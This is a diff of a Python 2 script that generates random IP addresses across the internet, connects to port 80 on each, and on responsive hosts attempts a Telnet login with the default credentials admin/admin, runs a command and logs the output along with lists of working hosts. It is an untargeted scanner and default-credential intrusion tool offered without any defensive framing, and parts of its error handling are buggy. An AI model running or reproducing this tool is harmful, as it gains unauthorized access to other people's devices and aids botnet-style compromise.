@@ -1,51 +1,90 @@
-import socket, os, time, telnetlib
+#Random IP Generator with Socket and Telnet support.#
+import socket, os, time, telnetlib, datetime
 from random import randint
 
+a = []
+b = []
+c = []
+today = []
 def randip():
     while True:
         yield ".".join(str(randint(1, 255)) for i in range(4))
 
-a = []
-fp = open("randip_log.txt", 'w')
+log = datetime.date.today()
+today.append(log)
+fp = open(str(today[0]) + "_randip_log.txt", 'w')
 for address in randip():
 	try:
-		#Socket tests with a timeout of 0.8 seconds#
-		s = socket.socket()
-		s.settimeout(0.8)
-		s.connect((address, 80))
-		print address, "WORKS!!!"
-		hostbyadr = socket.gethostbyaddr(address)
-		print hostbyadr
-		print "\n"
-		fp.write(address)
-		fp.write("\n")
-		fp.write(str(hostbyadr))
-		fp.write("\n")
-		print('Beginning Telnet attempt on %s\n' % address)
-		#Default telnet connection using admin as user and password#
 		try:
-			tn = telnetlib.Telnet(address, 3)
-			tn.read_until("login: ")
-			tn.write('admin' + '\n')
-			tn.read_until('Password: ')
-			tn.write('admin' + '\n')
-			tn.write("ls\n")
-			tn.write("exit\n")
-			print tn.read_all()
-			fp.write(tn.read_all())
-			tn.close()
-		except EOFError:
-			print(EOFError)
-			print(address)
+			#Socket tests with a timeout of 0.8 seconds#
+			s = socket.socket()
+			s.settimeout(0.8)
+			s.connect((address, 80))
+			print address, "WORKS!!!"
+			b.append(address)
+			hostbyadr = socket.gethostbyaddr(address)
+			print hostbyadr
+			c.append(hostbyadr)
+			print "\n"
+			fp.write(address)
+			fp.write("\n")
+			fp.write(str(hostbyadr))
+			fp.write("\n")
+			print('Beginning Telnet attempt on %s\n' % address)
+			#Default telnet connection using admin as user and password#
+			try:
+				tn = telnetlib.Telnet(address, 3)
+				tn.read_until("login: ")
+				time.sleep(3)#Sometimes telnet takes a second after login#
+				tn.write('admin' + '\n')
+				tn.read_until('Password: ')
+				tn.write('admin' + '\n')
+				tn.write("ls\n")
+				tn.write("exit\n")
+				print tn.read_all()
+				fp.write(tn.read_all())
+				tn.close()
+			except EOFError:
+				print(EOFError, address)
+				print '\n'
+				tn.close()
+				pass
+			except KeyboardInterrupt:
+				print('Keyboard Interrupt Detected.\n')
+				fp.write('Hosts Attempted(')
+				fp.write(str(a))
+				fp.write(')\n')
+				fp.write('\n')
+				fp.write('Working Hosts(')
+				fp.write(str(b))
+				fp.write(')\n')
+				fp.write('Working Host Lookup(')
+				fp.write(str(c))
+				fp.write(')\n')
+				fp.close()
+				s.close()
+				tn.close()
+				break
+		except socket.error:
+			print(socket.error, 'Failed to connect to %s' % address)
+			print '\n'
+			a.append(address)
+			pass
+		except socket.timeout:
+			print(timeout, '%s timeout' % address)
+			pass
+	except KeyboardInterrupt:
+		print('Keyboard Interrupt Detected.\n')
+		fp.write('Hosts Attempted(')
+		fp.write(str(a))
+		fp.write(')\n')
 		fp.write('\n')
-		a.append(address)
-		print('Hosts Attempted' + a + '\n')
-		while len(a) != 4:
-			continue
-		else:
-			print "..."
-			fp.close()
-			break
-	except socket.error:
-		print(socket.error)
-		print(address)
+		fp.write('Working Hosts(')
+		fp.write(str(b))
+		fp.write(')\n')
+		fp.write('Working Host Lookup(')
+		fp.write(str(c))
+		fp.write(')\n')
+		fp.close()
+		s.close()
+		break
